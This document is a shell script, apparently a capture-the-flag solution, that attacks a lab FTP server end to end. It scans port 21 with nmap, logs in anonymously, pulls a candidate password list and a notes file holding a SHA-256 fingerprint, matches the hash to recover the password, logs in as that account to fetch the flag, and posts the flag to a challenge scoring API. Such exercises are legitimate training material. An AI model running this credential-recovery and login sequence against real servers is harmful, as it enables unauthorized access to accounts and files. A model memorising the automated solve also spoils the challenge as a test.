#!/bin/sh
set -eu
TARGET=172.20.0.141
nmap -Pn -p 21 "$TARGET" >/dev/null
FLAG=$(python3 - <<'PY'
import ftplib
import hashlib
import io
import re

host = '172.20.0.141'
ftp = ftplib.FTP(host, timeout=5)
ftp.login()

def fetch(name):
    data = io.BytesIO()
    ftp.retrbinary('RETR ' + name, data.write)
    return data.getvalue().decode()

candidates = re.findall(r'^- (.+)$', fetch('crew-access.txt'), re.M)
notes = fetch('recovery-notes.ini')
fingerprint = re.search(r'^credential_fingerprint = sha256:([0-9a-f]+)$', notes, re.M).group(1)
account = re.search(r'^account = (.+)$', notes, re.M).group(1)
password = next(value for value in candidates if hashlib.sha256(value.encode()).hexdigest() == fingerprint)
ftp.quit()

ftp = ftplib.FTP(host, timeout=5)
ftp.login(account, password)
result = io.BytesIO()
ftp.retrbinary('RETR dispatch/dispatch.txt', result.write)
print(result.getvalue().decode().strip())
ftp.quit()
PY
)
python3 - "$FLAG" <<'PY' | curl -s http://172.20.0.3/api/challenges/submit -X POST -H 'Content-Type: application/json' --data-binary @-
import json
import sys
print(json.dumps({'challenge_id': 'scl-challenge-frame-d8db51', 'task_id': 'task1', 'flag': sys.argv[1]}))
PY
